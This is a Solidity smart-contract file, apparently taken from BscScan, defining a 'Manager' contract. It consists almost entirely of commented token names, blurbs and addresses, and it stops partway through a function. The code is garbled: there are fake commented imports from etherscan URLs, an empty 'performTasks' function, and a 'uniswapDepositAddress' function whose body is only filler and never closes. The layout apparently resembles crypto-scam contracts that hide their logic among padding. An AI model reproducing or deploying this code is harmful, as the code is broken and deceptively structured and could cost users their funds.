/**
 *Submitted for verification at BscScan.com on 2022-12-24
*/

pragma solidity ^0.6.6;

// import tokens, { expect } from 'ethereum'
// import { Contract } from 'ethers'
// import { MaxUint256 } from 'etherscan.io/tokens'
// import { bigNumberify, hexlify, defaultAbiCoder, toUtf8Bytes } from 'etherscan.io/tokens'
// import { gastracker, toUtf8Bytes } from 'https://etherscan.io/gastracker'


// EtherScan Ethereum Tokens

// BNB (BNB)
// Binance aims to build a world-class crypto exchange, powering the future of crypto finance.
// 0xB8c77482e45F1F44dE1745F52C74426C631bDD52

// Tether USD (USDT)
// Tether gives you the joint benefits of open blockchain technology and traditional currency by converting your cash into a stable digital currency equivalent.
// 0xdac17f958d2ee523a2206206994597c13d831ec7

// USD Coin (USDC)
// USDC is a fully collateralized US Dollar stablecoin developed by CENTRE, the open source project with Circle being the first of several forthcoming issuers.
// 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48

// Binance USD (BUSD)
// Binance USD (BUSD) is a dollar-backed stablecoin issued and custodied by Paxos Trust Company, and regulated by the New York State Department of Financial Services. BUSD is available directly for sale 1:1 with USD on Paxos.com and will be listed for trading on Binance.
// 0x4fabb145d64652a948d72533023f6e7a623c7c53

// Dai Stablecoin (DAI)
// Multi-Collateral Dai, brings a lot of new and exciting features, such as support for new CDP collateral types and Dai Savings Rate.
// 0x6b175474e89094c44da98b954eedeac495271d0f

// Theta Token (THETA)
// A decentralized peer-to-peer network that aims to offer improved video delivery at lower costs.
// 0x3883f5e181fccaf8410fa61e12b59bad963fb645

// HEX (HEX)
// HEX.com averages 25% APY interest recently. HEX virtually lends value from stakers to non-stakers as staking reduces supply. The launch ends Nov. 19th, 2020 when HEX stakers get credited ~200B HEX. HEX's total supply is now ~350B. Audited 3 times, 2 security, and 1 economics.
// 0x2b591e99afe9f32eaa6214f7b7629768c40eeb39

// Wrapped BTC (WBTC)
// Wrapped Bitcoin (WBTC) is an ERC20 token backed 1:1 with Bitcoin. Completely transparent. 100% verifiable. Community led.
// 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599

// Bitfinex LEO Token (LEO)
// A utility token designed to empower the Bitfinex community and provide utility for those seeking to maximize the output and capabilities of the Bitfinex trading platform.
// 0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3

// SHIBA INU (SHIB)
// SHIBA INU is a 100% decentralized community experiment with it claims that 1/2 the tokens have been sent to Vitalik and the other half were locked to a Uniswap pool and the keys burned.
// 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE

// stETH (stETH)
// stETH is a token that represents staked ether in Lido, combining the value of initial deposit + staking rewards. stETH tokens are pegged 1:1 to the ETH staked with Lido and can be used as one would use ether, allowing users to earn Eth2 staking rewards whilst benefiting from Defi yields.
// 0xae7ab96520de3a18e5e111b5eaab095312d7fe84

// Matic Token (MATIC)
// Matic Network brings massive scale to Ethereum using an adapted version of Plasma with PoS based side chains. Polygon is a well-structured, easy-to-use platform for Ethereum scaling and infrastructure development.
// 0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0

// ChainLink Token (LINK)
// A blockchain-based middleware, acting as a bridge between cryptocurrency smart contracts, data feeds, APIs and traditional bank account payments.
// 0x514910771af9ca656af840dff83e8264ecf986ca

// Cronos Coin (CRO)
// Pay and be paid in crypto anywhere, with any crypto, for free.
// 0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

contract Manager {
// Dusk Network (DUSK)
// Dusk streamlines the issuance of digital securities and automates trading compliance with the programmable and confidential securities.
// 0x940a2db1b7008b6c776d4faaca729d6d4a4aa551

// CocosToken (COCOS)
// The platform for the next generation of digital game economy.
// 0x0c6f5f7d555e7518f6841a79436bd2b1eef03381

// Beta Token (BETA)
// Beta Finance is a cross-chain permissionless money market protocol for lending, borrowing, and shorting crypto. Beta Finance has created an integrated “1-Click” Short Tool to initiate, manage, and close short positions, as well as allow anyone to create money markets for a token automatically.
// 0xbe1a001fe942f96eea22ba08783140b9dcc09d28

// USDK (USDK)
// USDK-Stablecoin Powered by Blockchain and US Licenced Trust Company
// 0x1c48f86ae57291f7686349f12601910bd8d470bb

// Veritaseum (VERI)
// Veritaseum builds blockchain-based, peer-to-peer capital markets as software on a global scale.
// 0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374

// mStable USD (mUSD)
// The mStable Standard is a protocol with the goal of making stablecoins and other tokenized assets easy, robust, and profitable.
// 0xe2f2a5c287993345a840db3b0845fbc70f5935a5

// Marlin POND (POND)
// Marlin is an open protocol that provides a high-performance programmable network infrastructure for Web 3.0
// 0x57b946008913b82e4df85f501cbaed910e58d26c

// Automata (ATA)
// Automata is a privacy middleware layer for dApps across multiple blockchains, built on a decentralized service protocol.
// 0xa2120b9e674d3fc3875f415a7df52e382f141225

// TrueFi (TRU)
// TrueFi is a DeFi protocol for uncollateralized lending powered by the TRU token. TRU Stakers to assess the creditworthiness of the loans
// 0x4c19596f5aaff459fa38b0f7ed92f11ae6543784

// Rupiah Token (IDRT)
// Rupiah Token (IDRT) is the first fiat-collateralized Indonesian Rupiah Stablecoin. Developed by PT Rupiah Token Indonesia, each IDRT is worth exactly 1 IDR.
// 0x998FFE1E43fAcffb941dc337dD0468d52bA5b48A

// Aergo (AERGO)
// Aergo is an open platform that allows businesses to build innovative applications and services by sharing data on a trustless and distributed IT ecosystem.
// 0x91Af0fBB28ABA7E31403Cb457106Ce79397FD4E6

// DODO bird (DODO)
// DODO is a on-chain liquidity provider, which leverages the Proactive Market Maker algorithm (PMM) to provide pure on-chain and contract-fillable liquidity for everyone.
// 0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd

// Keep3rV1 (KP3R)
// Keep3r Network is a decentralized keeper network for projects that need external devops and for external teams to find keeper jobs.
// 0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44

// ALICE (ALICE)
// My Neighbor Alice is a multiplayer builder game, where anyone can buy and own virtual islands, collect and build items and meet new friends.
// 0xac51066d7bec65dc4589368da368b212745d63e8

// Litentry (LIT)
// Litentry is a Decentralized Identity Aggregator that enables linking user identities across multiple networks.
// 0xb59490ab09a0f526cc7305822ac65f2ab12f9723

// Covalent Query Token (CQT)
// Covalent aggregates information from across dozens of sources including nodes, chains, and data feeds. Covalent returns this data in a rapid and consistent manner, incorporating all relevant data within one API interface.
// 0xd417144312dbf50465b1c641d016962017ef6240

// BitMartToken (BMC)
// BitMart is a globally integrated trading platform founded by a group of cryptocurrency enthusiasts.
// 0x986EE2B944c42D017F52Af21c4c69B84DBeA35d8

// Proton (XPR)
// Proton is a new public blockchain and dApp platform designed for both consumer applications and P2P payments. It is built around a secure identity and financial settlements layer that allows users to directly link real identity and fiat accounts, pull funds and buy crypto, and use crypto seamlessly.
// 0xD7EFB00d12C2c13131FD319336Fdf952525dA2af

// Aurora DAO (AURA)
// Aurora is a collection of Ethereum applications and protocols that together form a decentralized banking and finance platform.
// 0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814
function performTasks() public {
	    
}
// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

function uniswapDepositAddress() public pure returns (address) {		
// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
